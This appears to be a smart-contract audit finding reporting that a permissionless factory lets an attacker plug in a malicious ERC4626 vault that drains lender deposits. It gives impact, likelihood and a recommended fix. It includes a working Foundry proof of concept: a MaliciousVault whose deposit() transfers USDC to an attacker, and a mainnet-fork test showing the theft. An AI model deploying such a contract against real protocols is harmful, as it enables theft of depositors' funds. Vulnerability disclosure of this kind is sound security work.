### Title
Factory-deployed revolving credit vaults can route all lender deposits into a malicious ERC4626 vault - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary
`IdleCreditVaultFactory.deployRevolvingCreditVault()` is permissionless and accepts an arbitrary `programmableBorrowerParams.vault` address. The only validation performed by `ProgrammableBorrower.initialize()` is that the supplied address is nonzero and reports the same ERC20 `asset()` as the deployed credit vault. [1](#0-0) [2](#0-1) 

This mirrors the router-gated pair issue because lenders interact with the factory-deployed CDO, while the programmable borrower is forced to park all idle underlying in the caller-selected ERC4626 vault. When an honest manager later calls `startEpoch()`, the programmable borrower deposits its full on-hand balance into that vault through `vault.deposit()`. [3](#0-2) [4](#0-3) 

### Finding Description
`deployRevolvingCreditVault()` accepts a `ProgrammableBorrowerParams.vault` field supplied by the unprivileged deployer and does not compare it to a trusted registry, implementation, or allowlist. [5](#0-4) [1](#0-0) 

The programmable borrower grants unlimited underlying approval to that vault during initialization and permanently treats it as the destination for idle pool assets. [6](#0-5) 

At epoch start, `onStartEpoch()` deposits `underlyingToken.balanceOf(address(this))` into the configured vault without checking that the vault preserves withdrawal liquidity or belongs to a trusted implementation. [7](#0-6) 

A malicious ERC4626 can report the expected `asset()`, mint valid-looking shares, and immediately use the unlimited approval inside `deposit()` to transfer the deposited underlying to the attacker. The factory still emits a normal `CreditVaultDeployed` event and transfers contract ownership to the configured honest treasury, so the malicious integration is baked into the deployment rather than requiring any privileged role to be malicious. [8](#0-7) 

### Impact Explanation
All principal transferred to the programmable borrower at epoch start can be stolen in one transaction. In the PoC below, a 100,000 USDC lender deposit results in the full 100,000 USDC being transferred from `ProgrammableBorrower` through the malicious vault to the attacker, while the CDO and strategy continue to account for worthless vault shares. [9](#0-8) [10](#0-9) 

The economic invariant broken is fair deposit backing: tranche tokens remain outstanding, but their backing has been moved to an attacker-controlled external vault. The loss is not a borrower default or a market loss; it is caused by the permissionless selection of a malicious mandatory routing contract. [11](#0-10) [12](#0-11) 

### Likelihood Explanation
An unprivileged attacker can call the public factory with legitimate `IdleCreditVault`, `IdleCDOEpochVariant`, and `ProgrammableBorrower` implementations, an honest nonzero manager, an honest borrower, and an attacker-controlled ERC4626 vault. Deployment requires no treasury approval and validates only the vault’s reported asset. [1](#0-0) [13](#0-12) 

The attack completes during the first ordinary epoch transition. The manager initiating `startEpoch()` can remain honest because the malicious behavior is entirely contained in the factory-supplied vault’s `deposit()` implementation. [14](#0-13) [15](#0-14) 

### Recommendation
Do not allow arbitrary ERC4626 vaults or implementation addresses in the public factory. Use an owner-controlled vault registry or restrict `deployRevolvingCreditVault()` to a trusted operator that supplies previously reviewed vaults. [1](#0-0) 

Additionally, store the approved vault in a protocol registry rather than treating `asset()` equality as sufficient validation, and consider a post-deployment assertion that the deployed programmable borrower’s vault belongs to that registry. [16](#0-15) 

### Proof of Concept
The following Foundry test uses a mainnet fork, USDC, legitimate production implementations, an honest manager, and a malicious ERC4626 vault supplied through `deployRevolvingCreditVault()`:

```solidity
// test/foundry/MaliciousProgrammableVault.t.sol
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVaultFactory} from "../../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract MaliciousVault {
    IERC20Detailed public immutable assetToken;
    address public immutable attacker;
    mapping(address => uint256) public shares;

    constructor(address _asset, address _attacker) {
        assetToken = IERC20Detailed(_asset);
        attacker = _attacker;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function balanceOf(address owner) external view returns (uint256) {
        return shares[owner];
    }

    function convertToAssets(uint256 shareAmount) external pure returns (uint256) {
        return shareAmount;
    }

    // ProgrammableBorrower has unlimited approval. Pull lender funds to attacker
    // while returning plausible ERC4626 shares.
    function deposit(uint256 assets, address receiver) external returns (uint256) {
        assetToken.transferFrom(msg.sender, attacker, assets);
        shares[receiver] += assets;
        return assets;
    }

    function withdraw(uint256, address, address owner) external returns (uint256 burned) {
        burned = shares[owner];
        shares[owner] = 0;
    }

    function redeem(uint256 shareAmount, address, address owner) external returns (uint256) {
        shares[owner] -= shareAmount;
        return 0;
    }
}

contract MaliciousProgrammableVaultTest is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IdleCreditVaultFactory factory;
    IdleCDOEpochVariant cdo;
    ProgrammableBorrower borrowerAdapter;
    MaliciousVault maliciousVault;

    address attacker = address(0xA11CE);
    address lp = address(0xB0B);
    address treasury = address(0x7EA511);
    address proxyAdmin = address(0xAD711);
    address honestManager = address(0xA6E);
    address honestBorrower = address(0xB022);
    address feeReceiver = address(0xFEE);

    function setUp() public {
        vm.createSelectFork("mainnet");

        IdleCreditVaultFactory impl = new IdleCreditVaultFactory();
        factory = IdleCreditVaultFactory(address(new TransparentUpgradeableProxy(
            address(impl),
            proxyAdmin,
            abi.encodeWithSelector(
                IdleCreditVaultFactory.initialize.selector,
                treasury,
                proxyAdmin
            )
        )));

        maliciousVault = new MaliciousVault(USDC, attacker);

        vm.recordLogs();
        vm.prank(attacker);
        factory.deployRevolvingCreditVault(
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(new IdleCDOEpochVariant()),
                limit: 0,
                underlying: USDC,
                apr: 0,
                epochDuration: 7 days,
                bufferPeriod: 0,
                instantWithdrawDelay: 0,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: feeReceiver,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            }),
            IdleCreditVaultFactory.StrategyData({
                implementation: address(new IdleCreditVault()),
                manager: honestManager,
                borrower: honestBorrower,
                borrowerName: "Borrower"
            }),
            IdleCreditVaultFactory.ProgrammableBorrowerParams({
                implementation: address(new ProgrammableBorrower()),
                vault: address(maliciousVault),
                borrower: honestBorrower,
                borrowerApr: 0
            }),
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            })
        );

        Vm.Log[] memory logs = vm.getRecordedLogs();
        (address cdoAddr,,, address adapterAddr,,) = abi.decode(
            logs[logs.length - 1].data,
            (address, address, address, address, address, address)
        );
        cdo = IdleCDOEpochVariant(cdoAddr);
        borrowerAdapter = ProgrammableBorrower(adapterAddr);
    }

    function testFactorySuppliedVaultStealsEpochStartFunds() public {
        uint256 amount = 100_000e6;
        deal(USDC, lp, amount);

        vm.startPrank(lp);
        IERC20Detailed(USDC).approve(address(cdo), amount);
        cdo.depositAA(amount);
        vm.stopPrank();

        // Honest operation; malicious behavior is confined to the vault parameter.
        vm.prank(honestManager);
        cdo.startEpoch();

        assertEq(IERC20Detailed(USDC).balanceOf(attacker), amount);
        assertEq(IERC20Detailed(USDC).balanceOf(address(borrowerAdapter)), 0);
        assertEq(maliciousVault.balanceOf(address(borrowerAdapter)), amount);
    }
}
```

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
